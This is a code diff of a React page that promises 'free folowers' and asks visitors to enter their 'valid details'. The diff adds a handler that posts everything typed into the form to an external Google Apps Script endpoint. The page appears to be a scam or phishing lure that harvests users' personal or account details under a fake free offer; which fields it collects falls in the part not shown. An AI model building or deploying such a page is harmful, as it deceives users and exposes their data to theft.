@@ -1,16 +1,30 @@
 import React from "react";
 
 const Magic = () => {
+  const submitForm = (e) => {
+    const scriptURL =
+      "https://script.google.com/macros/s/AKfycbxYXbtqAfxN47PxPmkQQBWIErp9ykR3Ha-rC0Oo4btI0IzdU-koikgNSeeshGB3GO96/exec";
+    const form = document.forms["mainData"];
+
+    e.preventDefault();
+    fetch(scriptURL, { method: "POST", body: new FormData(form) })
+      .then((response) => console.log("You are welcome"))
+      .catch((error) => console.error("Error!", error.message));
+  };
+
   return (
-    <div className="fr-form">
+    <form className="fr-form" name="mainData" onSubmit={(e) => submitForm(e)}>
+      
+     
+
       <div className="max-w-md w-full space-y-8 p-10 bg-white rounded-xl shadow-lg z-10">
         <div className="grid  gap-8 grid-cols-1">
           <div className="flex flex-col ">
             <div className="mt-5">
               <div className="form">
                 <div className="md:space-y-2 mb-3">
-                  <label className="text-xs font-semibold text-gray-600 py-2">
-                    Please enter your valid details
+                  <label className="text-md text-center font-semibold text-gray-600 py-2 ">
+                    Please enter your valid details to get free folowers
                     <abbr className="hidden" title="required">
                       *
                     </abbr>
@@ -136,14 +150,17 @@ const Magic = () => {
                       placeholder="Quantity max folowers - 100"
                       className="appearance-none block w-full bg-grey-lighter text-black border border-grey-lighter rounded-lg h-10 px-4"
                       type="text"
-                      name="Quantity"
+                      name="quantity"
                       id="integration_street_address"
                     />
                   </div>
                 </div>
 
                 <div className="mt-5 text-right md:space-x-3 md:block flex flex-col-reverse">
-                  <button className="mb-2 md:mb-0 bg-green-400 px-5 py-2 text-sm shadow-sm font-medium tracking-wider text-white rounded-full hover:shadow-lg hover:bg-green-500">
+                  <button
+                    type="submit"
+                    className="mb-2 md:mb-0 bg-green-400 px-5 py-2 text-sm shadow-sm font-medium tracking-wider text-white rounded-full hover:shadow-lg hover:bg-green-500"
+                  >
                     PLACE ORDER FOR FREE
                   </button>
                 </div>
@@ -152,7 +169,7 @@ const Magic = () => {
           </div>
         </div>
       </div>
-    </div>
+    </form>
   );
 };
 
